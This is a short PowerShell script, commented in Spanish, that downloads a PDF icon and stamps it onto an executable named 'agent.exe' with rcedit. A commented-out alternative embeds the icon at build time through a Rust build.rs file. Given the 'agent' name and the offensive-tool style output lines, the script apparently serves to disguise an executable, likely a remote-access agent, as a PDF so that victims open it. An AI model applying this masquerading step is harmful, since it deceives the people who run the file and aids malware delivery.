# Script para añadir icono a agent.exe
# Requiere: Resource Hacker o rcedit

# OPCIÓN 1: Usando rcedit (más simple)
# Descargar de: https://github.com/electron/rcedit/releases

# 1. Descargar un icono PDF
Invoke-WebRequest -Uri "https://icon-library.com/images/pdf-icon-png/pdf-icon-png-1.jpg" -OutFile "pdf_icon.ico"

# 2. Aplicar icono al agent.exe
.\rcedit.exe "agent.exe" --set-icon "pdf_icon.ico"

# OPCIÓN 2: Añadir en build.rs del proyecto
<#
Crear archivo agent/build.rs con:

#[cfg(windows)]
extern crate winres;

fn main() {
    #[cfg(windows)]
    {
        let mut res = winres::WindowsResource::new();
        res.set_icon("icon.ico");  // Añadir icon.ico al proyecto
        res.compile().unwrap();
    }
}

Añadir a Cargo.toml:
[build-dependencies]
winres = "0.1"
#>

Write-Host "[*] Para añadir icono permanentemente, editar agent/build.rs"
Write-Host "[*] O usar rcedit después de compilar"
